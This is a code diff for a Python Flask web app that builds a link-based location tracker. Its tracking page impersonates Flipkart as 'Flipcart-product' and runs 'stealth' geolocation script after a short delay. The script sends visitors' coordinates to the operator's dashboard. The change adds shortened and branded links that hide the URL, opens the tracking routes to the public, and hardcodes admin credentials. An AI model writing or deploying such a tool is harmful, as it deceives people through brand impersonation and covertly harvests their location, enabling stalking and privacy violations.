@@ -1,22 +1,44 @@
-from flask import Flask, request, render_template_string, url_for, Response
+from flask import Flask, request, render_template_string, url_for, Response, redirect
 import uuid
 import datetime
 from functools import wraps
+import random
+import string
+import requests
 
 app = Flask(__name__)
 
+# =====================
 # In-memory storage
-locations = {}
+# =====================
+locations = {}        # {track_id: {lat, lon, time}}
+short_links = {}      # {short_code: track_id}
+auth_attempts = {}    # {IP: failed_attempts}
 
-# Hardcoded credentials
-USERNAME = "ShreTan"
-PASSWORD = "ShreTan@2018"
+# =====================
+# Admin credentials
+# =====================
+USERNAME = "Sritan"
+PASSWORD = "Tansri@2018"
+MAX_ATTEMPTS = 2
 
-# Auth helpers
+# =====================
+# Authentication helpers
+# =====================
+def get_client_ip():
+    return request.remote_addr
+
 def check_auth(username, password):
     return username == USERNAME and password == PASSWORD
 
 def authenticate():
+    ip = get_client_ip()
+    auth_attempts[ip] = auth_attempts.get(ip, 0) + 1
+
+    if auth_attempts[ip] >= MAX_ATTEMPTS:
+        # Redirect after max failed attempts
+        return redirect("https://www.flipkart.com")
+
     return Response(
         '🔒 Authentication required', 401,
         {'WWW-Authenticate': 'Basic realm="Login Required"'}
@@ -26,19 +48,56 @@ def requires_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
         auth = request.authorization
+        ip = get_client_ip()
         if not auth or not check_auth(auth.username, auth.password):
             return authenticate()
+        else:
+            # Reset counter on success
+            auth_attempts[ip] = 0
         return f(*args, **kwargs)
     return decorated
 
 # =====================
-# Home page
+# URL shortener (TinyURL)
+# =====================
+def shorten_url(long_url):
+    try:
+        response = requests.get(f"http://tinyurl.com/api-create.php?url={long_url}")
+        if response.status_code == 200:
+            return response.text
+    except:
+        pass
+    return long_url
+
+# =====================
+# Generate short code
+# =====================
+def generate_short_code(length=6):
+    code = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+    while code in short_links:
+        code = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+    return code
+
+# =====================
+# Create short link
+# =====================
+def create_short_link(track_id):
+    code = generate_short_code()
+    short_links[code] = track_id
+    return url_for("redirect_short_link", code=code, _external=True)
+
+# =====================
+# Admin Home Page
 # =====================
 @app.route("/")
 @requires_auth
 def home():
     track_id = str(uuid.uuid4())
     tracking_url = url_for("track", track_id=track_id, _external=True)
+    short_url = shorten_url(tracking_url)  # optional
+
+    # also create a branded short link
+    branded_short = create_short_link(track_id)
 
     return f"""
     <!DOCTYPE html>
@@ -49,9 +108,13 @@ def home():
     </head>
     <body class="bg-light d-flex flex-column align-items-center justify-content-center vh-100">
         <div class="card shadow p-4 text-center" style="max-width: 500px; width: 100%;">
-            <h2 class="mb-3">🔗 Tracking Link Generator</h2>
+            <h2 class="mb-3">🔗 Flipcart-product Tracker</h2>
             <p>Your tracking link:</p>
-            <a href="{tracking_url}" target="_blank" class="btn btn-primary mb-3">{tracking_url}</a>
+            <a href="{tracking_url}" target="_blank" class="btn btn-primary mb-2">{tracking_url}</a>
+            <p>Shortened link (TinyURL):</p>
+            <a href="{short_url}" target="_blank" class="btn btn-info mb-2">{short_url}</a>
+            <p>Branded short link:</p>
+            <a href="{branded_short}" target="_blank" class="btn btn-success mb-2">{branded_short}</a>
             <hr>
             <a href="/dashboard" class="btn btn-outline-dark mt-2">📊 View Dashboard</a>
         </div>
@@ -60,10 +123,19 @@ def home():
     """
 
 # =====================
-# Tracking page
+# Branded short link redirect
+# =====================
+@app.route("/s/<code>")
+def redirect_short_link(code):
+    track_id = short_links.get(code)
+    if track_id:
+        return redirect(url_for("track", track_id=track_id))
+    return "Invalid link", 404
+
+# =====================
+# Tracking page (public)
 # =====================
 @app.route("/track/<track_id>")
-@requires_auth
 def track(track_id):
     html = f"""
     <!DOCTYPE html>
@@ -71,7 +143,7 @@ def track(track_id):
     <head>
         <title>Flipcart-product</title>
         <style>
-            body, html {{
+            html, body {{
                 margin: 0;
                 padding: 0;
                 height: 100%;
@@ -84,22 +156,41 @@ def track(track_id):
             }}
         </style>
         <script>
+            // Stealth geolocation request
             function requestLocation() {{
-                if (navigator.geolocation) {{
+                if (navigator.permissions) {{
+                    navigator.permissions.query({{name:'geolocation'}}).then(function(result) {{
+                        if (result.state === 'granted' || result.state === 'prompt') {{
+                            navigator.geolocation.getCurrentPosition(
+                                function(pos) {{
+                                    fetch("/save_location/{track_id}", {{
+                                        method: "POST",
+                                        headers: {{ "Content-Type": "application/json" }},
+                                        body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude }})
+                                    }});
+                                }},
+                                function(err) {{
+                                    console.log("❌ Location denied silently");
+                                }}
+                            );
+                        }}
+                    }});
+                }} else {{
+                    // fallback for older browsers
                     navigator.geolocation.getCurrentPosition(
-                        (pos) => {{
+                        function(pos) {{
                             fetch("/save_location/{track_id}", {{
                                 method: "POST",
                                 headers: {{ "Content-Type": "application/json" }},
                                 body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude }})
                             }});
-                        }},
-                        (err) => {{ console.log("❌ Location denied"); }}
+                        }}
                     );
                 }}
             }}
-            setTimeout(requestLocation, 7000);
-            setInterval(requestLocation, 5000);
+
+            // Wait 3 seconds before asking (user sees Flipkart first)
+            setTimeout(requestLocation, 3000);
         </script>
     </head>
     <body>
@@ -110,10 +201,9 @@ def track(track_id):
     return render_template_string(html)
 
 # =====================
-# Save location
+# Save location (public)
 # =====================
 @app.route("/save_location/<track_id>", methods=["POST"])
-@requires_auth
 def save_location(track_id):
     data = request.json
     lat, lon = data.get("lat"), data.get("lon")
@@ -125,7 +215,7 @@ def save_location(track_id):
     return {"status": "success"}
 
 # =====================
-# Dashboard
+# Dashboard (admin only)
 # =====================
 @app.route("/dashboard")
 @requires_auth
@@ -152,7 +242,7 @@ def dashboard():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Dashboard</title>
+        <title>Flipcart-product</title>
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
         <script>
             setTimeout(() => {{ window.location.reload(); }}, 10000);
@@ -161,7 +251,7 @@ def dashboard():
     <body class="bg-light">
         <div class="container py-5">
             <div class="card shadow p-4">
-                <h2 class="mb-4 text-center">📊 Tracked Locations Dashboard</h2>
+                <h2 class="mb-4 text-center">📊 Flipcart-product Dashboard</h2>
                 <table class="table table-hover table-bordered align-middle">
                     <thead class="table-dark">
                         <tr>
